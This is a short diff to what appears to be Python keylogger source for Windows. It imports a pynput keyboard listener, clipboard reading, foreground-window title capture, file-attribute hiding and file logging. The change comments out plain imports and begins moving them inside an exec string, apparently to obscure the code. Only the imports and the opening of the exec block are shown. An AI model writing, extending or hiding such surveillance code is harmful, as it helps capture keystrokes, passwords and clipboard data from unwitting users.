@@ -1,12 +1,12 @@
-from logging import getLogger, Formatter, FileHandler, INFO
-from threading import Thread
+#from logging import getLogger, Formatter, FileHandler, INFO
+#from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
 from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
 from win32api import SetFileAttributes
 from pynput.keyboard import Key, Listener
-from time import sleep
-from sys import argv
-from os import getlogin, getenv, path
+#from time import sleep
+#from sys import argv
+#from os import getlogin, getenv, path
 exec(r"""
 from logging import getLogger, Formatter, FileHandler, INFO
 from threading import Thread
